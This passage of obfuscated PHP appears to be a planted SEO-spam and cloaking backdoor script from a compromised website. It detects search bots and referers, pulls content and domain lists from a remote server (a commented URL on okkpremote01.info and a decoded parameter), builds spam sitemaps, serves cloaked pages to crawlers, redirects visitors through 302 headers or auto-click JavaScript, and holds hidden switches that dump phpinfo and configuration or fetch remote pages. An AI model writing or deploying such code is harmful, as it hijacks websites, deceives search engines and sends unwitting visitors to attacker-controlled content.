    //echo $l1xj0grt;

    foreach($l1RB6TU as $l14eeRaA){
        $l1c9 = preg_replace("/(\?|&)".$l14eeRaA."/si",'',$l1c9);
    }


    $l1c9 = preg_replace("/^\//si",'',$l1c9);
    $l1c9 = $script_path !=''?preg_replace(sprintf("/^%s\//si",l1Rc6HvA($script_path)),'',$l1c9):$l1c9;


    if(!preg_match("/^\?/si",$l1c9)){
        $l1c9=preg_replace("/^($script_name)?(\?|\/)/si",'',$l1c9);
    }

    if(preg_match('/.(gif|jpe?g|ico|png|bmp|css|js)$/si',$l1c9)){
        exit();
    }

    $l1iQ = $param3;
    $l1iQ = preg_replace("/^\//si",'',$l1iQ);
    $l1Q8lar = l1Rc6HvA($l1c9);
    $l1FP8t = false;
    $l1g = isset($_GET["hostxml"]);
    $l1sH = ($l1g&&$_GET["hostxml"]!='') ? "{$_GET["hostxml"]}.xml" : "{$l1qv}-sitemap.xml";
    //$l177Y = "sitemap_"; // Not used?
    $l1yBQ = '';
    $l1jYBBQn = 0;
    $l1Zf0 = false;
    $l1qsb509 = 1;
    $l1r = 50000;
    $l1XwKTlO = 0;
    $l1VqK = 0;
    $l1VC2k = 0;
    $l1uVp = 1;
    $l13GLz = 1;
    $l1pods5 = 0;


    // Change htaccess so that all url request is handle by index
    // Respond according to file type

    if(preg_match('/\.xml$/si',$l1c9)){
        $l1c9=preg_replace("/^\?/si",'',$l1c9);
        $l1FP8t=true;
        $l1rWwO5=explode('/',$l1c9);
        $l1tZfKz=array_pop($l1rWwO5);
        if(preg_match("/([^\d]+)(\d+)\.xml$/si",$l1tZfKz,$l1lDPmlX)){
            //$l177Y=$l1lDPmlX[1]; // Not used?
            $l1jYBBQn=$l1lDPmlX[2];
        }else{
            //$l177Y=preg_replace("/([a-z]+_?).*/si","$1",$l1tZfKz); // Not used?
        }
        
        if(!empty($l1rWwO5)&&preg_match('/^([a-z])?(\d+)$/si',$l1rWwO5[count($l1rWwO5)-1],$l1b)){
            if(count($l1b)==3){
                $l1qsb509=$l1b[2];
                if($l1b[1]=='s'){
                    $l1VqK=1;
                }elseif($l1b[1]=='g'){
                    $l1VqK=2;
                }
            }else{
                $l1qsb509=$l1qsb509[0];
            }
            array_pop($l1rWwO5);
        }
        if(!empty($l1rWwO5)&&is_numeric($l1rWwO5[count($l1rWwO5)-1])){
            $l1r=array_pop($l1rWwO5);
            $l1Zf0=true;
        }
        if(!empty($l1rWwO5)){
            $l1yBQ=implode('/',$l1rWwO5);
        }
        $l1XwKTlO=$l1jYBBQn==1?1:(($l1r+1)*($l1jYBBQn-1)*$l1qsb509);
        $l1XwKTlO=$l1XwKTlO<0?0:$l1XwKTlO;
    }

    //print_r($l1c9);

    if(preg_match('/^listing((?:1|\w)+)?\/(\d+)\/(?:(\d+)\/)?\w+\.html$/si',preg_replace("/^\?/si",'',$l1c9),$l124kWx)){
        if($l124kWx[1]==1){
            $l1pods5=1;
        }
        $l1uVp = (int)$l124kWx[2];
        $l1VC2k = 1;
        if(isset($l124kWx[3])){
            $l13GLz = (int)$l124kWx[3];
        }
    }

    //echo "<b>$l13GLz</b>";

    $l1Ni6 = "$l1f1oojq/$script_path".($script_path==''?'':'/');
    $l1Z4k = $l1Z4k?"/$script_path".($script_path==''?'':'/'):$l1Ni6;
    $l1v = $param2;
    $l1ST2 = false;

    define("TEST_MODE",isset($_GET["list_test"])?true:false);

    foreach($l1YlvID as $l1W){
        if(isset($_GET[$l1W])){
            $l1ST2 = true;
            break;
        }
    }

    $l1z = true;
    foreach($l1YlvID as $l14){
        if(isset($_GET[$l14])){
            unset($_GET[$l14]);
        }
    }

    $referer = isset($_SERVER["HTTP_REFERER"])?$_SERVER["HTTP_REFERER"]:'';
    $user_agent = isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:'';

    $l13 = l1AZ($user_agent,$l1ST2);
    $l1aj= l1gVD2yX();
    $l1p38K = $param9[7]==0 ? $l1aj : ($param9[7]==1 ? $l13 : 1);
    $l1bgn=($l1aj||$l13)?0:l1Qw8rL($referer);
    $l1t = false;
    $l18 = "jpsitemap|mapxml";
    $l1Xy=explode('|',$l18);
    $l1YSXJ='';

    foreach($l1Xy as $l1xuDMZ){
        if(isset($_GET[$l1xuDMZ])){
            $l1t = true;
            $l1YSXJ = $l1xuDMZ;
            break;
        }
    }

    if(!$l1t&&!$l1z){
        return;
    }

    if(in_array($script_fullname,$l1jBj79X)){
        if(!isset($_GET) && $l1c9==''){
            $l1uH=true;
        }else{
            if(isset($_GET) && empty($_GET)){
                if($l1c9==''){
                    $l1uH=true;
                }else{
                    if($l1c9==$script_fullname){
                        $l1uH=true;
                    }
                }
            }else{
                if($l1c9 == '') $l1uH = true;
            }
        }
    }

    if(!$l1uH) $index_file = '';
    

    $param7 = decode_URL($param7);

    // http://zenjp65.okkpremote01.info/weilai0.php

    $l11ia = $param7."?yid=%d&lid=%d&from=%s&jump=%d&action=%s&cache=%d&ver=2.1.0&fb=%s";
    //$l1CEqH4 = "ls1";
    //$l1on="ls2";
    //$l1WxX="phpinf";
    //$l1VDKC="lstest";
    //$l1EkZsk = "lsarg";
    $l1S = "lspwd";
    $l1xUB = substr($param7,0,strrpos($param7,'/'))."/domain.txt"; // Domain URL encrypted?

    //echo $l1xUB;


    $l1DLH = $param7 . "?listing=%s";
    $l1TE9 = substr(md5($l1xUB),0,6);

    $l1GH0rfZ = array("extensions" => $l1T2,
                      "url_rules" => $l1gfDiJL,
                      "wordlist_array" => $wordlist,
                      "url_prefix" => $param3,
                      "url_prefix_qm" => $l1imRR,
                     );

    if($l1VC2k){

        $l1US = array();
        $l1O1M7v = array();
        $l1R = array();
        $l1l = in_array($l1uVp,array(1,3));

        if($l1uVp==1){
            $l1R=l19($l1f1oojq);
        }
        if($l1uVp==2){
            $l1US = l1HsDyi2($l1TE9,$l1xUB,$l13GLz); //TODO: check l1xUB
        }
        if($l1uVp==3){
            $l1R=l19($l1f1oojq);
            $l1US=l1HsDyi2($l1TE9,$l1xUB,$l13GLz);
        }


        if($l1pods5){
            $l1bq2wMI=array();
            if($l1l){
                $l1bq2wMI[]=sprintf("<%s-%s>",$param1,implode(',',$l1R["a"]));
            }
            $l1EE=null;
            $l1VuF=array();
            foreach($l1US as $l1MC=>$l1N37tH){
                $l1VuF[]=$l1MC;
                if($l1EE===null){
                    $l1EE=implode(',',$l1N37tH);
                }
            }

            if($l1EE!=null&&!empty($l1VuF)){
                $l1bq2wMI[]=sprintf("%s-%s",implode(',',$l1VuF),$l1EE);
            }

            if(!empty($l1bq2wMI)){
                $l1GlKWj=explode("|||",download(sprintf($l1DLH,implode('/',$l1bq2wMI))));
                foreach($l1GlKWj as $l10PuVe){
                    $l1x2JI9S=explode("---",$l10PuVe);
                    if(count($l1x2JI9S)==2){
                        $l1O1M7v[$l1x2JI9S[0]]=array();
                        $l10=explode("+++",$l1x2JI9S[1]);
                        foreach($l10 as $l1mr04t3){
                            $l1UlwA=explode('=>',$l1mr04t3);
                            if(count($l1UlwA)==2){
                                $l1O1M7v[$l1x2JI9S[0]][$l1UlwA[0]]=$l1UlwA[1];
                            }
                        }
                    }
                }
            }
        }


        $l1toTW="<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<title>list</title>\n</head>\n<body>\n%s\n</body>\n</html>";
        $l1Y='';

        if($l1l){
            foreach($l1R["a"]as$l1s8amxT=>$l1oGP){
                if($l1pods5&&isset($l1O1M7v[$param1])&&isset($l1O1M7v[$param1][$l1oGP])){
                    $l1Y.=$l1O1M7v[$param1][$l1oGP]."<br>";
                }
                    $l1Y.="$l1Ni6{$l1R["b"][$l1s8amxT]}"."<br>";
            }
        }

        foreach($l1US as$l1p=>$l1X1r){
            foreach($l1X1r as$l1xv){
                if($l1pods5&&isset($l1O1M7v[$l1p])&&isset($l1O1M7v[$l1p][$l1xv])){
                    $l1Y.=$l1O1M7v[$l1p][$l1xv]."<br>";
                }
                $l1Y.=l1guW(array($l1p,$l1xv,'',''),$l1GH0rfZ,1)."<br>";
            }
        }

        echo sprintf($l1toTW,$l1Y);
        exit();
    }


    /* Generate sitemap xml */
    if($l1t||$l1FP8t||$l1g){
        $xml_header = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
        $sitemap_loc = "<loc>%s</loc>";

        if($l1g){
            $l1jHQLt = array($l1f1oojq);
            if($script_path != '') $l1jHQLt[] = $l1Ni6;
            
            $l1WEPla = download($l1f1oojq);
            if($l1WEPla != ''){
                $l1jHQLt = array_merge($l1jHQLt,l1BSTEtn($l1WEPla));
                $l1jHQLt = array_unique($l1jHQLt);
            }
            header(sprintf($content_header,'x'));
            echo $xml_header;
            @write_file($l1sH,$xml_header);
            $l1Nc = array();

            if(!empty($l1jHQLt)){
                foreach($l1jHQLt as$l1LtvM5){
                if(count($l1Nc) >= 100){
                    $l1gn = implode('',$l1Nc);
                    echo $l1gn;
                    @write_file($l1sH,$l1gn,'a');
                    $l1gn='';
                    $l1Nc=array();
                }
                $l1Nc[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>",sprintf($sitemap_loc,l1kw6(preg_match("/^https?\:\/\//si",$l1LtvM5)?$l1LtvM5:"$l1Ni6$l1LtvM5")),date("Y-m-d"));
                }
            }
            if(!empty($l1Nc)){
                $l1gn = implode('',$l1Nc);
                echo $l1gn;
                @write_file($l1sH,$l1gn,'a');
                $l1gn='';
                $l1Nc=array();
            }

            $l1FiZB = "\n\t</urlset>";
            echo $l1FiZB;
            @write_file($l1sH,$l1FiZB,'a');
            exit();
        }

        $l1Z4k = $l1Ni6;
        $l1yaqM = isset($_GET["html"]) ? (int)($_GET["html"]) : '';

        if(file_exists($l1TE9)){
            $l14XZNk = file_get_contents($l1TE9);
        }else{
            $l14XZNk = download($l1xUB); // Download encrypted domain file
            @write_file($l1TE9,$l14XZNk);
            @change_timestamp($l1TE9);
        }

        $l14XZNk = trim($l14XZNk,'|');

        if($l14XZNk != ''){
            $l1US = explode('|',$l14XZNk);

            if(is_numeric($l1yaqM)&&$l1yaqM>0){
                $l1SSAANd="\x3c!DOCTYPE html>\n\x3chtml>\n\x3chead>\n\t\x3cmeta charset=\"utf-8\">\n\t\x3cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\x3ctitle>\x3c/title>\n\x3c/head>\n\x3cbody>";
                foreach($l1US as$l1k0){
                    $l1A=explode('-',$l1k0);
                    for($l17K=0;$l17K<$l1yaqM;$l17K++){
                        $l1VV=mt_rand(1,$l1A[2]);
                        $l11ia = l1guW(array($l1A[0],$l1VV,'',''),$l1GH0rfZ,1);
                        $l1SSAANd.=sprintf('<a href="%s" target="_blank">%s</a><br>'."\n",$l11ia,$l11ia);
                    }
                }
                echo $l1SSAANd."\n\x3c/body>\n\x3c/html>";
                exit();
            }

            $l1EYB = $l1r;
            $l1quNG = $l1yBQ;
            $l1IHKBWW = $l1qsb509;
            $l1H = $l1XwKTlO;
            $l1lhlbf3 = $l1Ni6;
            $l1HiS = $l1Ni6;
            $l1g2MIU = '';
            $l1B = 0;

            foreach($l1US as $l1FQ9sMt=>$l1TXqIy2){
                $l1B += (int)substr($l1TXqIy2,strrpos($l1TXqIy2,'-')+1);
            }

            if($l1B<=0) exit("nodata");

            $l15 = ceil($l1B/$l1EYB);
            $l1EYB = $l1IHKBWW>$l15?$l1EYB:$l1EYB;
            $l1XfT = $l1gR0e=$l1m7a=$l1IHKBWW;
            $l1NVN7 = array();
            $l1u1Pi = 0;

            header(sprintf($content_header,'x'));

            echo $xml_header;
            if(!empty($l1US)){
                $l1QEn=0;
                $l1ut=$l17x=0;
                foreach($l1US as $l1k0){
                    if($l1ut>=$l1EYB){
                        break;
                    }

                    $l1L2r = explode('-',$l1k0);
                    $l112sTd = $l1L2r[0];
                    $l1rjnW = $l1L2r[2];
                    $l1JHedwW = l1spc7n9($l1rjnW-1,$l1IHKBWW,$l1VqK,$l19);

                    if(!empty($l1JHedwW)){
                        foreach($l1JHedwW as$l1wq){
                            if($l1ut>=$l1EYB){
                                break;
                            }
                            if($l1u1Pi>50){
                                $l1kLHy=implode('',$l1NVN7);
                                echo $l1kLHy;
                                $l1NVN7=array();
                                $l1u1Pi=0;
                            }

                            $l1JX11vj  = '';
                            $l1JX11vj .= "<url>";
                            $l1JX11vj .= sprintf($sitemap_loc,l1kw6(l1guW(array($l112sTd,$l1wq,'',''),1)));
                            $l1JX11vj .= "<lastmod>".date("Y-m-d")."</lastmod>";
                            $l1JX11vj .= "<changefreq>weekly</changefreq>";
                            $l1JX11vj .= "</url>";
                            $l1NVN7[]  = $l1JX11vj;
                            $l1ut++;
                            $l1u1Pi++;
                        }

                        $l1kLHy = implode('',$l1NVN7);
                        echo $l1kLHy;
                        $l1NVN7 = array();
                    }
                }
            }

            $l1NVN7[] = "\n\t</urlset>";
            $l1I0 = implode('',$l1NVN7);
            $l1NVN7 = array();
            echo $l1I0;
        }else{
            echo "feterr:".$l1xUB;
            exit();
        }
        
        exit();
    }

    $l1B3 = l1g1oAl2($l1c9,$l1gfDiJL,$l1T2);
    $l1nzHzs = (bool)$l1B3[0];

    if($l1z&&($l1p38K||$l1bgn)){
    $l1WyZOKd=0;
    if(!$l1nzHzs){
        $param2 = !$l1uH ? l1J('',$l1uH,$l1v,"$l1xj0grt|"."ls1") : $param2;
        if($param9[7] ==2 && !$l1aj){
            $l1WyZOKd=1;
        }else{
            if($l1uH){
                if($l1p38K){
                    if(!$param9[0]){
                    $l1WyZOKd=1;
                    }
                }
                if($l1bgn){
                    if(!$param9[1]){
                    $l1bgn=0;
                    }if(!$param9[2]){
                    $l1WyZOKd=1;
                    }
                }
            }else{
                if($l1p38K){
                    if(!$param9[3]) $l1WyZOKd=1;
                }
                if($l1bgn){
                    if(!$param9[4]) $l1bgn=0;
                    if(!$param9[5]) $l1WyZOKd=1;
                }
            }
        }
    }else{
        $l1FWjrO = l15w($param1,$param2,$l1B3[1]);
        $param1 = $l1FWjrO["a"] != -1 ? $l1FWjrO["a"] : $param1;
        $param2 = $l1FWjrO["b"] != -1 ? $l1FWjrO["b"] : $param1;
    }

    $l12 = '<a href="%s" target="_blank">%s</a>';
    $l11ia = sprintf($l11ia,$param1,$param2,urlencode($l1i),!$l1bgn?0:1,'',$param8[0],$script_fullname);
    $l11ia.= sprintf("&isn=%d&ish=%d&wdm=%d",($l1nzHzs?1:0),($l1uH?1:0),$param8[3]);

    if(isset($_GET["ls1"])){
        echo sprintf($l12,$l11ia,$l11ia)."<br /><br />";
        $l1Q = parse_url($l11ia);
        echo gethostbyname($l1Q["host"]);
        exit();
    }

    if(isset($_GET["ls2"])){
        echo sprintf($l12,$l1xUB,$l1xUB);
        exit();
    }

    /* Run phpinfo */
    if(isset($_GET["phpinf"])){
        phpinfo();
        exit();
    }

    /* Download remote page */
    if(isset($_GET["lstest"])){
        $target_url = trim($_GET["lstest"]);
        $target_url = $target_url == '' ? "http://example.com" : $target_url;
        if($target_url != ''){
            echo download($l1V65T);
            exit();
        }
    }


    /* Display config */
    if(isset($_GET["lsarg"])){
        echo sprintf("domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s",$l13dbLD,$l19,$param3,$param4,$param5,$param6,$param7,implode('',$param8),$l1c,$l1cdE);
        exit();
    }

    if($l1WyZOKd){
        if($index_file != '') echo file_get_contents($index_file);
        return;
    }

    $l1Kr = trim(download($l11ia));

    if($l1Kr==''){
        header("HTTP/1.1 404 Not Found");
        header("status: 404 Not Found");
        exit();
    }

    if(preg_match("/^https?\:\/\//",$l1Kr)){
        if($param9[6]){
            header("Location:$l1Kr",true,302);
        }else{
            echo sprintf('<body onload="document.getElementsByTagName(%sa%s)[0].click()"><a href="%s"></a><noscript><meta http-equiv="refresh" content="0; url=%s" /></noscript></body>',"'","'",$l1Kr,$l1Kr);
        }
        exit();
    }

    preg_match_all("/\?yumingid=\d+&lineid=\d+[^>]+>.*?</",$l1Kr,$l1JM65);

    if(isset($l1JM65[0]) && !empty($l1JM65[0])){
        foreach($l1JM65[0] as $l15tgG){
            preg_match_all("/\?yumingid=(\d+)&lineid=(\d+)([^>]+>)(.*?)</",$l15tgG,$l1glCv);
            $l1Kr = str_replace($l15tgG,l1guW(array($l1glCv[1][0],$l1glCv[2][0],$l1glCv[3][0],$l1glCv[4][0])),$l1Kr);
        }
    }

    $l1Kr = str_replace("[##zhang##]","$l1Z4k$param3",$l1Kr);
    $param6 = trim($param6);

    if($param6 != ''){
        $l1IRrvcA = array();
        preg_match(sprintf("/<head.*%s>/si",'?'),$l1Kr,$l1IRrvcA);
        if(!empty($l1IRrvcA[0])){
            $l1Kr = str_replace($l1IRrvcA[0],$l1IRrvcA[0]."\n$param6",$l1Kr);
        }else{
            $l1Kr = str_replace("</head>","$param6\n</head>",$l1Kr);
        }
    }

    echo "$l1Kr";
    exit();
    }

    if($index_file != '') echo file_get_contents($index_file);
}

main();

